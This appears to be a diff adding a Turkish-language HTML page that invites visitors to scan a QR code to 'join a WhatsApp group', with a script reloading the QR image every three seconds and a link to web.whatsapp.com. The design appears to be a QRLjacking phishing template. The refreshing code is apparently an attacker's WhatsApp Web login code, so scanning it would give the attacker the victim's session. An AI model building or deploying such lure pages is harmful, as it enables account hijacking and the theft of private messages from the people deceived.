@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<head>
+<title>WhatsApp Grubuna Katıl</title>
+</head>
+<body>
+<script>
+var myTimer; myTimer = window.setInterval(reloadD,3000);
+function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
+</script>
+</br>
+<center><h1><b>Whatsapp Grubuna katıl: {{name}}</b></h1>
+</br>
+Whatsapp grubumuza katılmak için aşağıdaki karekodu okut:
+</br>
+</br> Bu QR Code sürekli güncellenir
+</br>
+</br>
+</b><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
+</br> Detaylı bilgi için <a href='http://web.whatsapp.com/'>URL</a>, Karekodu okut ve WhatsApp grubumuza katıl!
+</br>
+</center>
+</body>
+</html>
